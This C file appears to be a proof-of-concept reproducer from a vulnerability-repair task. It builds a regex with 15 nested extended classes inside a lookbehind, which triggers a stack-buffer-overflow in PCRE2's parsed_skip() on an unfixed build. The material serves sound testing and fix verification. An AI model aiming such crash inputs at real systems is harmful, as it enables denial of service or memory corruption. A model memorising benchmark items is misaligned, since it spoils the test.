/* Residual-defect PoC for the "nested extended class inside a lookbehind"
   fix. Drives the public pcre2_compile() entry point with an in-contract
   pattern: a fixed-length extended class nested to the maximum depth the
   parser accepts (ECLASS_NEST_LIMIT == 15 levels), placed inside a
   lookbehind so that the lookbehind length scan walks the class with
   parsed_skip().

   On the shipped tree parsed_skip() records each open class in a stack that
   is one slot too small, so the deepest allowed nesting writes past the end
   of the stack (AddressSanitizer: stack-buffer-overflow). On the golden tree
   the same pattern compiles cleanly.

   Build (against the ASan-instrumented static library in this tree):
     gcc -g -fsanitize=address -I src pocs/residual.c \
         .libs/libpcre2-8.a -o /tmp/residual
   Run:
     /tmp/residual
*/

#include <stdio.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
/* (?<= [a[a...[aa]...]] )  with 15 nested '[' -- the maximum the parser
   permits before ERR207 ("extended character class nesting is too deep"). */
char pattern[128];
int depth = 15;
size_t pos = 0;

pos += (size_t)snprintf(pattern + pos, sizeof(pattern) - pos, "(?<=");
for (int i = 0; i < depth; i++)
  pos += (size_t)snprintf(pattern + pos, sizeof(pattern) - pos, "[a");
pos += (size_t)snprintf(pattern + pos, sizeof(pattern) - pos, "a");
for (int i = 0; i < depth; i++)
  pos += (size_t)snprintf(pattern + pos, sizeof(pattern) - pos, "]");
pos += (size_t)snprintf(pattern + pos, sizeof(pattern) - pos, ")");

printf("pattern: %s\n", pattern);

int errorcode;
PCRE2_SIZE erroroffset;
pcre2_code *re = pcre2_compile(
  (PCRE2_SPTR)pattern, PCRE2_ZERO_TERMINATED,
  PCRE2_ALT_EXTENDED_CLASS,
  &errorcode, &erroroffset, NULL);

if (re == NULL)
  {
  PCRE2_UCHAR buf[256];
  pcre2_get_error_message(errorcode, buf, sizeof(buf));
  printf("compile failed: error %d at offset %d: %s\n",
         errorcode, (int)erroroffset, (char *)buf);
  return 1;
  }

printf("compiled OK\n");
pcre2_code_free(re);
return 0;
}
